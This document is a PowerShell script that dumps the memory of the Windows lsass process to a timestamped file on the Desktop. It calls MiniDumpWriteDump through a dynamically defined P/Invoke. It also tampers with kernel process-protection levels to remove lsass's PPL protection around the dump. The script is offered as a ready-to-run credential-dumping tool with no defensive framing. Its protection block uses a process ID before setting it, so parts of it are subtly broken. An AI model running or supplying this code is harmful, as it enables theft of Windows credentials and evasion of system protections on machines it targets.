Import-Module NativeInteropLib -ErrorAction Stop

try {
    $Module = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule.ScopeName -eq "DynamicInvoke" } | Select-Object -Last 1
    $Dumper = $Module.GetTypes()[0]
}
catch {
    $Module = [AppDomain]::CurrentDomain.DefineDynamicAssembly("DynamicAssembly", 1).DefineDynamicModule("DynamicInvoke", $False).DefineType("DumperType")
    
    $Module.DefinePInvokeMethod(
        "MiniDumpWriteDump",
        "dbgcore.dll",
        22, # Public, Static, PinvokeImpl
        1,  # Standard calling convention
        [bool], # Return type (BOOL)
        [Type[]]@(
            [IntPtr], # hProcess
            [Int32],  # ProcessId
            [IntPtr], # hFile
            [Int32],  # DumpType
            [Int64], # ExceptionParam
            [Int64], # UserStreamParam
            [Int64]  # CallbackParam
        ),
        1,  # CharSet (Auto)
        3   # SetLastError
    ).SetImplementationFlags(128) # PreserveSig
    
    $Dumper = $Module.CreateType()
}

Clear-Host

# 1. Ensure Administrator Privileges
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "[-] This script must be run as an Administrator."
    return
}

# 2. Handle Eprocess protection modification safely
try {
    $eProc = Query-EprocessStruct -ProcessID $PID
    Update-ProcessProtection -Eprocess $eProc -SignerValue WinTcb -TypeValue PP
    $eProc = Query-EprocessStruct -ProcessID $ProcId
    Update-ProcessProtection -Eprocess $eProc -SignerValue None -TypeValue None
} catch {
    Write-Warning "[!] Failed to update process protection. Continuing anyway..."
}

# 3. Safely retrieve lsass process
$Proc = [System.Diagnostics.Process]::GetProcessesByName("lsass")
if (-not $Proc) {
    Write-Error "[-] Could not find the lsass process."
    return
}

$Proc     = $Proc[0]
$ProcId   = $Proc.Id
$hProcess = $Proc.Handle

# 4. Generate timestamped dump path
Set-Location ([Environment]::GetFolderPath("Desktop"))
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$dumpPath  = "$PWD\lsass_$timestamp.dmp"
$fs        = [System.IO.File]::Create($dumpPath)

try {
    $success = $Dumper::MiniDumpWriteDump([IntPtr]$hProcess, $ProcId, [IntPtr]($fs.SafeFileHandle.DangerousGetHandle()), [int32]2, 0L, 0L, 0L)
    if ($success) {
        Write-Host "[+] Successfully dumped lsass to: $dumpPath" -ForegroundColor Green
    } else {
        Write-Error "[-] MiniDumpWriteDump failed."
    }
}
finally {
    if ($fs) { 
        $fs.Close()
        $fs.Dispose()
    }
}

# 3. Handle Eprocess protection modification safely
try {
    $eProc = Query-EprocessStruct -ProcessID $PID
    Update-ProcessProtection -Eprocess $eProc -SignerValue None -TypeValue None
    $eProc = Query-EprocessStruct -ProcessID $ProcId
    Update-ProcessProtection -Eprocess $eProc -SignerValue WinSystem -TypeValue PP
} catch {
    Write-Warning "[!] Failed to update process protection. Continuing anyway..."
}